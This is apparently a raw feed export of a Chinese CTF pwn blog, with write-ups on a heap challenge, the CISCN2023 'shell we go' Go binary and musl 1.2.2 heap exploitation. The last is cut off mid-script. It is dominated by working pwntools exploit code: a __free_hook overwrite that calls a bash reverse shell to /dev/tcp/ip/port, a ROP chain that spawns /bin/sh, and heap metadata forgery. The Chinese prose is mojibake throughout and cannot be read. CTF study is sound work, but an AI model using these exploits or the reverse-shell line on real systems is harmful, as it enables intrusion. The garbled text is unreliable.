class="hljs-string">b&#x27;flee\n&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;Congratulations!&#x27;</span> <span class="hljs-keyword">in</span> t:<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">grow</span>(<span class="hljs-params">num, size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter the operation:&#x27;</span>, <span class="hljs-string">b&#x27;grow&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter the vector number:&#x27;</span>, <span class="hljs-built_in">str</span>(num).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter the grow value:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">push</span>(<span class="hljs-params">num, value</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter the operation:&#x27;</span>, <span class="hljs-string">b&#x27;push&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter the vector number:&#x27;</span>, <span class="hljs-built_in">str</span>(num).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;value:&#x27;</span>, <span class="hljs-built_in">str</span>(value).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_payload</span>(<span class="hljs-params">num, payload</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> payload:<br>        push(num, i)<br><br>p.sendline(<span class="hljs-string">b&#x27;Data_testing_console&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Enter function name:&#x27;</span>, <span class="hljs-string">b&#x27;free&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>leak = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>libc_base = leak - libc.sym[<span class="hljs-string">&#x27;free&#x27;</span>]<br>libc.address = libc_base<br>p.sendlineafter(<span class="hljs-string">b&#x27;Enter the command:&#x27;</span>, <span class="hljs-string">b&#x27;data_push&#x27;</span>)<br><br><br>size = <span class="hljs-number">0x200</span><br>grow(<span class="hljs-number">1</span>, size)<br>grow(<span class="hljs-number">2</span>, size)<br>grow(<span class="hljs-number">2</span>, size)<br>send_payload(<span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x10</span>)<br>grow(<span class="hljs-number">2</span>, size)<br>grow(<span class="hljs-number">3</span>, size)<br>send_payload(<span class="hljs-number">3</span>, p64(libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>] - <span class="hljs-number">0x58</span>))<br>grow(<span class="hljs-number">4</span>, size)<br><br><span class="hljs-comment">#pause()</span><br>payload = <span class="hljs-string">b&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;&quot;</span>.ljust(<span class="hljs-number">0x58</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])<br>payload = payload.ljust(<span class="hljs-number">0x1d0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>send_payload(<span class="hljs-number">5</span>, payload)<br>grow(<span class="hljs-number">5</span>, size)<br><br><span class="hljs-comment"># push 1 0x95a0  </span><br><span class="hljs-comment"># push 2 0x96b0</span><br><span class="hljs-comment"># push 3 0x97c0</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CISCN2023 shell we go</title>
    <link href="/2023/05/30/CISCN2023-shell-we-go/"/>
    <url>/2023/05/30/CISCN2023-shell-we-go/</url>
    
    <content type="html"><![CDATA[<p>åœ¨å›½èµ›ä¸Šé‡åˆ°çš„ä¸€é“goè¯­è¨€çš„é¢˜ï¼Œè‡ªå·±ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡é‡åˆ°ï¼Œåœ¨æ­¤è®°å½•ä¸€ä¸‹å¤ç°çš„è¿‡ç¨‹ã€‚</p><p>â€‹</p><p>ç”±äºgoè¯­è¨€ç¼–è¯‘éƒ½æ˜¯é™æ€çš„ï¼Œè€Œä¸”ç¨‹åºæŠŠæ‰€æœ‰çš„ç¬¦å·è¡¨éƒ½å»æ‰äº†ï¼Œå¯¹äºé€†å‘çš„éš¾åº¦å¤§å¤§æå‡ï¼Œè™½ç„¶å¯ä»¥é€šè¿‡è¾“å‡ºçš„å­—ç¬¦ä¸²å¿«é€Ÿæ‰¾åˆ°ä¸»å‡½æ•°ï¼Œä½†æ˜¯å¯¹äºä¸€äº›goè¯­è¨€çš„åº“å‡½æ•°æ ¹æœ¬å°±æ— æ³•åˆ¤æ–­ï¼Œåˆ†æè¿™äº›åº“å‡½æ•°åªä¼šæµªè´¹å¤§é‡æ—¶é—´ï¼›è¿™é‡Œä½¿ç”¨ä¸€ä¸‹<a href="https://github.com/renshareck/IDAGolangHelper_SupportGo1.20">IDAGolangHelper</a>ï¼Œå¯ä»¥ä¿®å¤goçš„ç¬¦å·è¡¨ã€‚</p><p>è¿›å…¥ç¨‹åºåå¾ˆå¿«å°±æƒ³åˆ°è¾“å…¥å¸¸ç”¨çš„shellå‘½ä»¤ï¼Œä½†æ˜¯è¾“å‡ºåªæœ‰â€œCert Is A Mustâ€ï¼ŒæŸ¥æ‰¾â€Certâ€œå­—ç¬¦ä¸²å¯ä»¥çœ‹åˆ°è¿˜æœ‰ä¸€ä¸ªâ€Cert complete, you can explore moreâ€œï¼Œè¯´æ˜éœ€è¦è¾“å…¥ä¸€äº›ä¸œè¥¿è®¤è¯ï¼š</p><img src="/img/13/Screenshot 2023-05-30 172622.png" style="zoom:80%;" /><p>â€‹</p><p>å¼•ç”¨è¯¥å­—ç¬¦ä¸²çš„å‡½æ•°ä¸ºmain_unk_func0b01ï¼Œå¥½åƒçœ‹ä¸å‡ºä»€ä¹ˆä¸œè¥¿ï¼š</p><img src="/img/13/Screenshot 2023-05-30 173651.png" style="zoom: 80%;" /><p>æ¥ç€å‘ä¸Šæ‰¾å¼•ç”¨main_unk_func0b01çš„å‡½æ•°ï¼Œçœ‹åˆ°main_unk_func0b05å‡½æ•°ï¼Œå¾ˆå¿«å°±å‘ç°ä¼ªä»£ç ä¸­æ²¡æœ‰è°ƒç”¨è¿‡main_unk_func0b01å‡½æ•°çš„ç—•è¿¹ï¼š</p><img src="/img/13/Screenshot 2023-05-30 174350.png" style="zoom: 67%;" /><p>â€‹</p><p>ç›´æ¥æŸ¥çœ‹è¯¥å‡½æ•°çš„æ±‡ç¼–ï¼Œæœç„¶ida7.7çš„ä¼ªä»£ç åŠŸèƒ½å¯¹goæ— æ³•å‡†ç¡®è¯†åˆ«ã€‚å‡½æ•°ä¸­ä¸‹é¢çš„å—å…¨æ˜¯cmpï¼Œå°†ä¸€äº›å¥‡æ€ªçš„16è¿›åˆ¶æ•°å˜æˆå­—ç¬¦ä¸²ï¼ˆéœ€è¦é€†åºçœ‹ï¼‰ï¼Œå¯ä»¥æ¸…æ™°åœ°çœ‹åˆ°åŸºæœ¬ä¸Šå…¨æ˜¯ä¸€ä¸ªå…ˆæ¯”è¾ƒå­—ç¬¦ä¸²é•¿åº¦ï¼Œå†å»æ¯”è¾ƒå­—ç¬¦å†…å®¹çš„ä¸€ä¸ªè¿‡ç¨‹ï¼Œshellä¸­ä¸åŒæŒ‡ä»¤çš„å®ç°æ˜¯å°†è¯¥è¿‡ç¨‹é‡å¤å¤šæ¬¡æ¥åˆ¤æ–­æŒ‡ä»¤çš„å†…å®¹ï¼Œè¿›è€Œè·³è½¬åˆ°ç›¸åº”çš„åœ°æ–¹å»å®ç°ä¸åŒæŒ‡ä»¤çš„åŠŸèƒ½ï¼š</p><img src="/img/13/Screenshot 2023-05-30 184428.png" style="zoom: 50%;" /><p>åœ¨cmpæ—¶ï¼Œæ•°æ®å…¨æ˜¯åœ¨raxçš„åœ°å€è·å–çš„ï¼Œä¹Ÿå¾ˆå®¹æ˜“çœ‹åˆ°ä¸€ä¸ªè§„å¾‹ï¼š[rax + i]ä¸ºå­—ç¬¦ä¸²çš„åœ°å€ï¼Œ[rax + i * 8]ä¸ºå­—ç¬¦ä¸²çš„å¤§å°ï¼Œraxå¯„å­˜å™¨ä¹‹å‰ä¸€æ¬¡æ”¹å˜æ˜¯åœ¨è°ƒç”¨strings_genSplitå‡½æ•°åï¼Œé€šè¿‡gdbè°ƒè¯•å‘ç°è¯¥å‡½æ•°é€šè¿‡ç©ºæ ¼æ¥åˆ†å‰²å­—ç¬¦ä¸²ï¼Œraxä¿å­˜å­—ç¬¦ä¸²åˆ†å‰²åçš„ä¿¡æ¯ï¼Œrbxæ˜¯åˆ†å‰²çš„å—æ•°ï¼š</p><p>â€‹        <img src="/img/13/Screenshot 2023-05-30 192441.png" style="zoom: 50%;" /></p><p>â€‹<img src="/img/13/Screenshot 2023-05-30 192627.png" style="zoom:50%;" /></p><p>â€‹</p><p>æ¥ä¸‹æ¥å¾ˆå¤šä¸œè¥¿éƒ½å¯ä»¥é¡ºåˆ©çœ‹æ‡‚äº†ï¼Œæƒ³è¿›å…¥main_unk_func0b0å‡½æ•°ï¼Œåˆ†å‰²çš„å—æ•°ä¸º3ï¼Œç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²ä¸ºâ€certâ€ï¼Œç¬¬äºŒä¸ªå­—ç¬¦ä¸²ä¸ºâ€nAcDsMicNâ€ï¼Œç¬¬ä¸‰ä¸ªå­—ç¬¦ä¸²è¿›å…¥main_unk_func0b0å‡½æ•°åå†å»è¿›ä¸€æ­¥æ¯”è¾ƒã€‚æ¥ä¸‹æ¥å†è¿›å…¥main_unk_func0b0åˆ†æï¼Œçœ‹åˆ°crypto_rc4_NewCipherã€encoding_base64__ptr_Encoding_EncodeToStringè¿™äº›åº“å‡½æ•°ï¼Œç›´æ¥å»ç½‘ä¸Šæœä¸€ä¸‹ï¼Œè¿™äº›å‡½æ•°å°±æ˜¯cr4åŠ å¯†åå†è¿›è¡Œbase64ç¼–ç ï¼Œï¼Œæœ€åä¸â€JLIX8pbSvYZu&#x2F;WaGâ€æ¯”è¾ƒï¼Œé€šè¿‡è¿™ä¸ªç½‘ç«™å°±å¯ä»¥è§£å¯†ï¼š<a href="https://www.lddgo.net/encrypt/rc4">https://www.lddgo.net/encrypt/rc4</a></p><img src="/img/13/Screenshot 2023-05-30 013458.png" style="zoom:50%;" /><p>â€‹</p><p>è¾“å…¥â€cert nAcDsMicN S33UAga1n@#!â€åå°±èƒ½çœŸæ­£å»ä½¿ç”¨è¿™ä¸ªshellï¼Œå›è¿‡å¤´å»çœ‹main_unk_func0b05å‡½æ•°ä¸­æ¯”è¾ƒçš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥å‘ç°çš„æŒ‡ä»¤æœ‰â€lsâ€ã€â€cdâ€ã€â€catâ€ã€â€whoamiâ€ã€â€echoâ€ã€â€exitâ€ï¼Œå…¶ä¸­åªæœ‰â€lsâ€å’Œâ€cdâ€æ‰èƒ½çœŸæ­£å®ç°ç›¸åº”çš„åŠŸèƒ½ï¼Œè€ŒcatåŒ¹é…åˆ°flagæ—¶ä¼šè¾“å‡ºä¸€ä¸ªå‡çš„flag(ğŸ˜¦)ï¼ŒçœŸæ­£æœ‰ç”¨çš„æ˜¯echoä¼šè¿›å…¥main_unk_func0b04å‡½æ•°ã€‚</p><p>main_unk_func0b04å‡½æ•°ä¸­é€šè¿‡è¾“å…¥çš„å­—ç¬¦ä¸²çš„å¤§å°ï¼ˆé™¤ç©ºæ ¼ï¼‰ä½œä¸ºå¾ªç¯çš„å¤§å°ï¼Œå°†å…¶å•ä¸ªå­—èŠ‚å¾ªç¯å¤åˆ¶åˆ°æ ˆä¸­ï¼Œè¿™é‡Œæ˜¯ä¸€ä¸ªechoçš„æ ˆæº¢å‡ºï¼Œmain_unk_func0b04å‡½æ•°ä¼šå…ˆå¯¹æ¯ä¸€ä¸ªå­—ç¬¦ä¸²å—çš„å¤§å°è¿›è¡Œæ£€æŸ¥ï¼Œç›´æ¥ä½¿ç”¨ç©ºæ ¼ç»•è¿‡å³å¯ï¼š</p><img src="/img/13/Screenshot 2023-05-30 201147.png" style="zoom:50%;" /><p>è€Œåœ¨ä¸´è¿‘rbpçš„éƒ¨åˆ†å­˜ç€å¤åˆ¶è¿‡ç¨‹ä¸­å¾ªç¯çš„å¤§å°ä¸æ ˆçš„ç›¸å¯¹åŸºå€ï¼Œå¦‚æœç›´æ¥å¡«å……æ•°æ®æº¢å‡ºçš„æ•°æ®å°†å…¶æ”¹å˜å°±ä¼šä½¿å¤åˆ¶æ•°æ®å¤±è´¥ï¼Œä¸èƒ½è¦†ç›–è¿”å›åœ°å€äº†ï¼Œè¿™é‡Œä½¿ç”¨â€+â€è¿™ä¸ªå­—ç¬¦å¯ä»¥ä¸å¯¹è®©æ•°æ®ä¸å¤åˆ¶åˆ°æ ˆä¸Šï¼Œè€Œå¾ªç¯çš„å¤§å°ä¾ç„¶å†å¢åŠ ï¼š</p><img src="/img/13/Screenshot 2023-05-30 201330.png" style="zoom: 50%;" /><p>â€‹</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;pwn&#x27;</span>)<br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>pop_rdi_ret = <span class="hljs-number">0x444fec</span><br>pop_rsi_ret = <span class="hljs-number">0x41e818</span><br>pop_rdx_ret = <span class="hljs-number">0x49e11d</span><br>pop_rax_ret = <span class="hljs-number">0x40d9e6</span><br>syscall_ret = <span class="hljs-number">0x4636e9</span><br>bss = <span class="hljs-number">0x5A2C88</span><br><br>p.sendlineafter(<span class="hljs-string">b&#x27;$&#x27;</span>, <span class="hljs-string">b&#x27;cert nAcDsMicN S33UAga1n@#!&#x27;</span>)<br><br>payload = p64(pop_rdi_ret) + p64(<span class="hljs-number">0</span>) + p64(pop_rsi_ret) + p64(bss) + p64(pop_rdx_ret) + p64(<span class="hljs-number">8</span>) + p64(pop_rax_ret) + p64(<span class="hljs-number">0</span>) + p64(syscall_ret)<br>payload += p64(pop_rdi_ret) + p64(bss) + p64(pop_rsi_ret) + p64(<span class="hljs-number">0</span>) + p64(pop_rdx_ret) + p64(<span class="hljs-number">0</span>) + p64(pop_rax_ret) + p64(<span class="hljs-number">0x3b</span>) + p64(syscall_ret)<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;#&#x27;</span>, <span class="hljs-string">b&#x27;echo &#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x200</span> - <span class="hljs-number">0x100</span> - <span class="hljs-number">0xd</span>) + <span class="hljs-string">b&#x27; &#x27;</span> + <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">0x110</span> + <span class="hljs-string">b&#x27;+&#x27;</span> * <span class="hljs-number">0x20</span> + payload)<br>p.send(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>musl 1.2.2çš„ä¸¤é“pwné¢˜</title>
    <link href="/2023/04/04/musl-pwn/"/>
    <url>/2023/04/04/musl-pwn/</url>
    
    <content type="html"><![CDATA[<p>musl 1.2.2å †çš„å†…å­˜ç®¡ç†ä¸ä»¥å‰å­¦çš„glibcå®Œå…¨ä¸åŒï¼Œæ˜¯å°†ä¸€å—è¿ç»­çš„å†…å­˜åˆ’åˆ†ä¸ºç›¸åŒçš„å¤§å°çš„chunkï¼ˆæœ‰ç‚¹åƒslabï¼‰ï¼Œå†å»ç”±groupã€metaã€malloc_contextè¿™äº›ç»“æ„ä½“é€çº§å»ç®¡ç†ï¼Œæ¨èå¤§å®¶å¤šçœ‹å‡ é0xRGzå¸ˆå‚…çš„muslæºç è§£æ<a href="https://bbs.kanxue.com/thread-269533-1.htm#msg_header_h3_8">æ–‡ç« </a>ï¼Œè¿™é‡Œä¸»è¦å†™çš„æ˜¯è‡ªå·±åœ¨å¤ç°musl pwné¢˜ä¸­æ‰€å­¦åˆ°çš„ä¸€äº›ç»†èŠ‚ã€‚</p><p>â€‹                                                     </p><h3 id="å‰ç½®è¦ç‚¹"><a href="#å‰ç½®è¦ç‚¹" class="headerlink" title="å‰ç½®è¦ç‚¹"></a>å‰ç½®è¦ç‚¹</h3><h4 id="åˆ†é…ç­–ç•¥"><a href="#åˆ†é…ç­–ç•¥" class="headerlink" title="åˆ†é…ç­–ç•¥"></a>åˆ†é…ç­–ç•¥</h4><p>éœ€è¦è®°ä½çš„æ˜¯<strong>åˆšé‡Šæ”¾çš„chunkä¸ä¼šè¢«ç«‹åˆ»ä½¿ç”¨</strong>ï¼š</p><ul><li>åœ¨åŒä¸€çš„groupä¸­ï¼Œå¦‚æœavail_maskä¸ä¸º0ï¼Œå¦‚æœé‡Šæ”¾ä¸€ä¸ªè¯¥groupä¸­çš„chunkï¼Œæ¥ä¸‹æ¥ç”³è¯·chunkä¹Ÿåªä¼šä¼˜å…ˆç”³è¯·é‚£äº›è¢«avail_maskæ ‡è¯†çš„ï¼Œè€Œä¸ä¼šå»ä½¿ç”¨åˆšé‡Šæ”¾çš„ï¼›</li><li>å¦‚æœavail_mask ä¸º0ï¼Œå°±ä¼šå»æ‰¾meta-&gt;nextæ‰€æŒ‡å‘çš„metaï¼Œè°ƒç”¨activate_groupå‡½æ•°æ›´æ–°ä¸‹ä¸€ä¸ªmetaçš„avail_maskï¼Œæ¥ç€å»ä½¿ç”¨ä¸‹ä¸€ä¸ªmetaä¸­çš„chunkï¼ŒåŒæ—¶å°†ä¸‹ä¸€ä¸ªmetaæ›´æ–°ä¸ºé“¾è¡¨å¤´ã€‚</li></ul><p>â€‹                                                                      </p><h4 id="dequeue"><a href="#dequeue" class="headerlink" title="dequeue"></a>dequeue</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">dequeue</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> meta **phead, <span class="hljs-keyword">struct</span> meta *m)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (m-&gt;next != m) &#123;<br>        m-&gt;prev-&gt;next = m-&gt;next;<br>        m-&gt;next-&gt;prev = m-&gt;prev;<br>        <span class="hljs-keyword">if</span> (*phead == m) *phead = m-&gt;next;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        *phead = <span class="hljs-number">0</span>;<br>    &#125;<br>    m-&gt;prev = m-&gt;next = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>dequeue</strong> è§¦å‘æ¡ä»¶ï¼š</p><ul><li><p>avail_mask è¡¨ç¤ºåªæœ‰ä¸€ä¸ªchunk è¢«ä½¿ç”¨ ï¼Œfreed_mask &#x3D; 0ï¼Œè€Œfreeåˆšå¥½è¦free ä¸€ä¸ªchunkï¼›</p></li><li><p>avail_mask &#x3D; 0, freed_maskè¡¨ç¤ºåªæœ‰1ä¸ª chunkæ²¡è¢«é‡Šæ”¾ï¼Œè¿™æ—¶é‡Šæ”¾çš„chunkå°±æ˜¯æœ€åä¸€ä¸ªchunkï¼›</p></li><li><p>avail_mask &#x3D; 0, freed_mask &#x3D; 0ï¼Œä¸”ç»§ç»­ç”³è¯·è¯¥å¤§å°çš„chunkï¼Œè¿™æ—¶å°±ä¼šunlinkæ­¤metaï¼Œä½¿ç”¨æ–°çš„metaåˆ†é…ã€‚</p></li></ul><p>â€‹                                                               </p><h4 id="queue"><a href="#queue" class="headerlink" title="queue"></a>queue</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">queue</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> meta **phead, <span class="hljs-keyword">struct</span> meta *m)</span><br>&#123;<br>assert(!m-&gt;next);<br>assert(!m-&gt;prev);<br><span class="hljs-keyword">if</span> (*phead) &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">meta</span> *<span class="hljs-title">head</span> =</span> *phead;<br>m-&gt;next = head;<br>m-&gt;prev = head-&gt;prev;<br>m-&gt;next-&gt;prev = m-&gt;prev-&gt;next = m;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>m-&gt;prev = m-&gt;next = m;<br>*phead = m;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>queue</strong> è§¦å‘æ¡ä»¶ï¼š</p><p>avail_mask &#x3D; 0ï¼Œ freed_mask &#x3D; 0ï¼Œé‡Šæ”¾å…¶ä¸­çš„ä¸€ä¸ªchunkï¼ˆå½“ç„¶è¯¥metaå·²ç»æ˜¯dequeueçš„ï¼‰ã€‚</p><p>â€‹                                                                          </p><h3 id="ç¥¥äº‘æ¯2021-babymull"><a href="#ç¥¥äº‘æ¯2021-babymull" class="headerlink" title="ç¥¥äº‘æ¯2021 babymull"></a>ç¥¥äº‘æ¯2021 babymull</h3><p>è¿™é‡Œæ˜¯ç›´æ¥å‚è€ƒçš„è¿™ç¯‡<a href="https://mp.weixin.qq.com/s/UwrZVlQ_WJ5rO4InOErt1g">wp</a>ã€‚</p><p>æœ€ä¸»è¦çš„å°±æ˜¯é€šè¿‡åé—¨å‡½æ•°å»æ³„æ¼malloc_contextçš„secretï¼Œä¿®æ”¹chunkçš„offsetï¼Œè®©å…¶æ‰¾åˆ°ä¼ªé€ çš„groupï¼Œå†é€šè¿‡ä¼ªé€ çš„groupæ‰¾åˆ°ä¼ªé€ çš„metaï¼Œqueueä¼ªé€ çš„metaï¼Œæœ€åä¿®æ”¹ä¼ªé€ çš„meta-&gt;memåœ°å€ï¼Œå®ç°ä»»æ„åœ°å€å†™ã€‚</p><p>â€‹</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;babymull&#x27;</span>)<br>libc = elf.libc<br>p = process(<span class="hljs-string">&#x27;./babymull&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, content, name = <span class="hljs-string">b&#x27;a&#x27;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">b&#x27;Name:&#x27;</span>, name)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gift</span>(<span class="hljs-params">set_null, leak</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x73317331</span>).encode())<br>    p.sendline(<span class="hljs-built_in">str</span>(set_null).encode())<br>    p.sendline(<span class="hljs-built_in">str</span>(leak).encode())<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    add(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span> + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x1000</span>, <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x1000</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x238</span> + p32(<span class="hljs-number">5</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0xf</span>)<br>show(<span class="hljs-number">5</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = leak + <span class="hljs-number">0x2aa0</span><br><br>mmap_addr = libc_base - <span class="hljs-number">0x4000</span><br>stdin = libc_base + libc.sym[<span class="hljs-string">&#x27;__stdin_FILE&#x27;</span>]<br>stdout = libc_base + libc.sym[<span class="hljs-string">&#x27;__stdout_FILE&#x27;</span>]<br>malloc_context = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_context&#x27;</span>]<br>gadget = libc_base + <span class="hljs-number">0x4bcf3</span><br>pop_rdi_ret = libc_base + <span class="hljs-number">0x15536</span><br>pop_rsi_ret = libc_base + <span class="hljs-number">0x1b3a9</span><br>pop_rdx_ret = libc_base + <span class="hljs-number">0x177c7</span><br>ret = pop_rdi_ret + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br><br>gift(leak - <span class="hljs-number">8</span> + <span class="hljs-number">6</span>, malloc_context)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>secret = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>), <span class="hljs-number">16</span>)<br><br>delete(<span class="hljs-number">0</span>)<br>fake_meta = mmap_addr + <span 